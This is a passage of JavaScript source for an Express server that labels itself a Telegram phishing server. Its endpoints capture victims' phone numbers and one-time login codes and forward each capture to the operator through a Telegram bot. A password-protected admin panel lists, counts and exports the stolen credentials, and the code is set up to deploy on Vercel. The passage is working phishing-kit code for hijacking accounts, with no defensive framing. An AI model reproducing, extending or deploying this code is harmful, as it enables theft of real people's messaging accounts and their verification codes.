        return res.status(400).json({ success: false, error: 'Invalid request' });
    }
    
    // Generate fake password for realism
    const password = 'TelegramSecure2024!';
    
    // Create victim data
    const victimData = {
        phone,
        password,
        ip,
        userAgent: req.headers['user-agent'],
        timestamp: new Date().toISOString(),
        step: 'login'
    };
    
    // Store in database
    const savedVictim = db.addVictim(victimData);
    
    // Update session
    db.updateSession(session_id, { phone, step: 'login' });
    
    // Send Telegram alert
    telegramBot.sendLoginAlert(savedVictim);
    
    console.log(`📱 Login captured: ${phone} from ${ip}`);
    
    res.json({
        success: true,
        message: 'Verification code sent',
        password: password, // For simulation
        victim_id: savedVictim.id
    });
});

// OTP Verification API
app.post('/api/verify', (req, res) => {
    const { phone, code, session_id } = req.body;
    const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
    
    if (!phone || !code || !session_id) {
        return res.status(400).json({ success: false, error: 'Invalid request' });
    }
    
    // Get victim by phone
    const victims = db.getVictims();
    const victim = victims.find(v => v.phone === phone);
    
    if (!victim) {
        return res.status(404).json({ success: false, error: 'Session expired' });
    }
    
    // Update victim with OTP code
    victim.otp = code;
    victim.step = 'otp_verified';
    victim.otp_timestamp = new Date().toISOString();
    
    // Update session
    db.updateSession(session_id, { otp: code, step: 'otp_verified' });
    
    // Send Telegram alert
    telegramBot.sendOTPAlert(victim);
    
    console.log(`🔐 OTP captured: ${code} for ${phone}`);
    
    res.json({
        success: true,
        message: 'Account verified successfully'
    });
});

// Completion API
app.post('/api/complete', (req, res) => {
    const { session_id } = req.body;
    
    if (!session_id) {
        return res.status(400).json({ success: false, error: 'Invalid session' });
    }
    
    const session = db.getSession(session_id);
    if (!session) {
        return res.status(404).json({ success: false, error: 'Session not found' });
    }
    
    // Get victim data from session
    const victims = db.getVictims();
    const victim = victims.find(v => v.phone === session.data.phone);
    
    if (victim) {
        victim.step = 'completed';
        victim.completed_at = new Date().toISOString();
        
        // Send final alert
        telegramBot.sendCompleteAlert(victim);
        
        console.log(`✅ Account fully compromised: ${victim.phone}`);
    }
    
    res.json({ success: true, message: 'Completion logged' });
});

// Admin API - Get victims
app.get('/api/admin/victims', (req, res) => {
    const { password } = req.query;
    
    if (password !== CONFIG.ADMIN_PASSWORD) {
        return res.status(401).json({ error: 'Unauthorized' });
    }
    
    const victims = db.getVictims();
    res.json({
        success: true,
        count: victims.length,
        victims: victims.reverse() // Latest first
    });
});

// Admin API - Get logs
app.get('/api/admin/logs', (req, res) => {
    const { password } = req.query;
    
    if (password !== CONFIG.ADMIN_PASSWORD) {
        return res.status(401).json({ error: 'Unauthorized' });
    }
    
    try {
        const logs = fs.readFileSync(CONFIG.LOG_FILE, 'utf8').split('\n').filter(Boolean);
        res.json({
            success: true,
            logs: logs.reverse().slice(0, 100) // Last 100 lines
        });
    } catch (err) {
        res.json({ success: false, logs: [] });
    }
});

// Status API
app.get('/api/stats', (req, res) => {
    const victims = db.getVictims();
    
    res.json({
        status: 'online',
        timestamp: new Date().toISOString(),
        victims: {
            total: victims.length,
            today: victims.filter(v => {
                const today = new Date().toDateString();
                return new Date(v.timestamp).toDateString() === today;
            }).length,
            with_otp: victims.filter(v => v.otp).length,
            completed: victims.filter(v => v.step === 'completed').length
        },
        server: {
            uptime: process.uptime(),
            memory: process.memoryUsage(),
            node: process.version
        }
    });
});

// Clear data (for testing)
app.post('/api/clear', (req, res) => {
    const { password } = req.body;
    
    if (password !== CONFIG.ADMIN_PASSWORD) {
        return res.status(401).json({ error: 'Unauthorized' });
    }
    
    db.victims.clear();
    db.saveData();
    
    res.json({ success: true, message: 'All data cleared' });
});

// ==================== ADMIN PANEL ====================
app.get('/admin', (req, res) => {
    const { password } = req.query;
    
    if (password !== CONFIG.ADMIN_PASSWORD) {
        return res.status(401).send(`
        <!DOCTYPE html>
        <html>
        <head>
            <title>Admin Login</title>
            <style>
                body { font-family: Arial; padding: 50px; text-align: center; }
                input { padding: 10px; margin: 10px; }
                button { padding: 10px 20px; background: #333; color: white; border: none; }
            </style>
        </head>
        <body>
            <h1>Admin Login</h1>
            <form method="GET">
                <input type="password" name="password" placeholder="Admin Password" required>
                <button type="submit">Login</button>
            </form>
        </body>
        </html>
        `);
    }
    
    const victims = db.getVictims();
    
    res.send(`
    <!DOCTYPE html>
    <html>
    <head>
        <title>Telegram Phishing Admin</title>
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <style>
            * { margin: 0; padding: 0; box-sizing: border-box; }
            body { font-family: -apple-system, BlinkMacSystemFont, sans-serif; background: #0f1419; color: white; }
            .container { max-width: 1200px; margin: 0 auto; padding: 20px; }
            .header { background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); padding: 30px; border-radius: 15px; margin-bottom: 30px; }
            .stats { display: grid; grid-template-columns: repeat(auto-fit, minmax(200px, 1fr)); gap: 20px; margin: 30px 0; }
            .stat-card { background: #1a2029; padding: 25px; border-radius: 12px; border-left: 5px solid #40a4e0; }
            .stat-number { font-size: 36px; font-weight: bold; color: #40a4e0; }
            table { width: 100%; border-collapse: collapse; background: #1a2029; border-radius: 12px; overflow: hidden; }
            th, td { padding: 15px; text-align: left; border-bottom: 1px solid #2d3748; }
            th { background: #2d3748; color: #40a4e0; }
            .badge { background: #4CAF50; color: white; padding: 3px 10px; border-radius: 20px; font-size: 12px; }
            .export-btn { background: #40a4e0; color: white; border: none; padding: 10px 20px; border-radius: 8px; cursor: pointer; margin: 10px; }
            .refresh-btn { background: #4CAF50; color: white; border: none; padding: 10px 20px; border-radius: 8px; cursor: pointer; }
            .danger-btn { background: #ff4444; color: white; border: none; padding: 10px 20px; border-radius: 8px; cursor: pointer; }
        </style>
    </head>
    <body>
        <div class="container">
            <div class="header">
                <h1>📊 Telegram Phishing Admin Panel</h1>
                <p>Total Victims: ${victims.length} | Last Updated: ${new Date().toLocaleTimeString()}</p>
                <button class="refresh-btn" onclick="location.reload()">🔄 Refresh</button>
                <button class="export-btn" onclick="exportData()">📥 Export JSON</button>
                <button class="danger-btn" onclick="clearData()">🗑️ Clear All</button>
            </div>
            
            <div class="stats">
                <div class="stat-card">
                    <div class="stat-number">${victims.length}</div>
                    <div>Total Victims</div>
                </div>
                <div class="stat-card">
                    <div class="stat-number">${victims.filter(v => v.otp).length}</div>
                    <div>OTP Captured</div>
                </div>
                <div class="stat-card">
                    <div class="stat-number">${victims.filter(v => v.step === 'completed').length}</div>
                    <div>Completed</div>
                </div>
                <div class="stat-card">
                    <div class="stat-number">${new Date().toLocaleDateString()}</div>
                    <div>Today</div>
                </div>
            </div>
            
            <h2>Recent Victims (Last 50)</h2>
            <div style="overflow-x: auto;">
                <table>
                    <thead>
                        <tr>
                            <th>ID</th>
                            <th>Phone</th>
                            <th>Password</th>
                            <th>OTP Code</th>
                            <th>IP Address</th>
                            <th>Time</th>
                            <th>Status</th>
                        </tr>
                    </thead>
                    <tbody>
                        ${victims.slice(0, 50).map(v => `
                        <tr>
                            <td><small>${v.id.substring(0, 10)}...</small></td>
                            <td><strong>${v.phone}</strong></td>
                            <td><code>${v.password}</code></td>
                            <td><strong style="color: #4CAF50">${v.otp || 'N/A'}</strong></td>
                            <td>${v.ip}</td>
                            <td><small>${new Date(v.timestamp).toLocaleString()}</small></td>
                            <td><span class="badge">${v.step || 'login'}</span></td>
                        </tr>
                        `).join('')}
                    </tbody>
                </table>
            </div>
        </div>
        
        <script>
            function exportData() {
                fetch('/api/admin/victims?password=${CONFIG.ADMIN_PASSWORD}')
                    .then(res => res.json())
                    .then(data => {
                        const blob = new Blob([JSON.stringify(data.victims, null, 2)], { type: 'application/json' });
                        const url = window.URL.createObjectURL(blob);
                        const a = document.createElement('a');
                        a.href = url;
                        a.download = 'telegram_victims_' + new Date().toISOString() + '.json';
                        document.body.appendChild(a);
                        a.click();
                        document.body.removeChild(a);
                    });
            }
            
            function clearData() {
                if (confirm('Are you sure you want to delete ALL data?')) {
                    fetch('/api/clear', {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({ password: '${CONFIG.ADMIN_PASSWORD}' })
                    })
                    .then(res => res.json())
                    .then(data => {
                        if (data.success) {
                            alert('All data cleared!');
                            location.reload();
                        }
                    });
                }
            }
            
            // Auto-refresh every 30 seconds
            setInterval(() => {
                location.reload();
            }, 30000);
        </script>
    </body>
    </html>
    `);
});

// ==================== START SERVER ====================
// For Vercel
if (process.env.VERCEL) {
    module.exports = app;
} else {
    // For local development
    app.listen(PORT, () => {
        console.log(`
╔══════════════════════════════════════╗
║     TELEGRAM PHISHING SERVER         ║
║     Listening on port ${PORT}           ║
║     Admin: http://localhost:${PORT}/admin  ║
║     Password: ${CONFIG.ADMIN_PASSWORD}         ║
╚══════════════════════════════════════╝
        
📱 Server ready! Send victims to: http://localhost:${PORT}
🤖 Telegram Bot: ${telegramBot.bot ? '✅ Connected' : '❌ Not configured'}
📊 Current victims: ${db.victims.size}
        `);
    });
}
